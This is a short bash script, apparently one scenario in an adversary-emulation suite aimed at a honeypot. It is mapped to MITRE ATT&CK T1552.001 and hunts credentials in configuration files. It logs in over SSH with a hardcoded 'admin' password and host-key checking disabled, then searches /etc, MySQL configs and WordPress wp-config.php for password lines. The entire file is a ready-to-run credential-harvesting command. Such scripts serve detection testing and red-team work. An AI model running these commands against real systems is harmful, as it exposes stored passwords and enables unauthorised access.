#!/usr/bin/env bash
# S12 — Config File Credential Hunt
# Tactic : Credential Access (TA0006)
# Technique: T1552.001 Unsecured Credentials: Credentials In Files
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S12 Config File Credential Hunt — ${TARGET} ==="
$SSH "find /etc -name '*.conf' -readable 2>/dev/null | head -10; grep -r 'password' /etc/mysql 2>/dev/null | head -5; cat /var/www/html/wp-config.php 2>/dev/null | grep -i pass" && echo "[OK]" || echo "[FAIL]"
